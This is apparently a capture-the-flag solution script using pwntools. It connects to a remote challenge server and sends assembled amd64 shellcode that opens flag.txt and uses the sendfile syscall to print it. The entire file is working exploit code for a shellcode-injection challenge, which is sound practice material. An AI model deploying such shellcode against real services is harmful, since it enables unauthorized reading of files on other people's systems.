import pwn
#p = pwn.process("./shellcode")
p = pwn.remote("34.134.85.196",5337)
first = pwn.shellcraft.amd64.open("flag.txt",0)+pwn.shellcraft.amd64.mov("rsi","rax")
second = """
    mov rdi, 1
    mov rsi, rax
    mov rdx, 0
    mov r10, 1000
    mov rax, 40
    syscall
"""

p.sendline(pwn.asm(first+second, arch="amd64", os="linux"))
p.interactive()


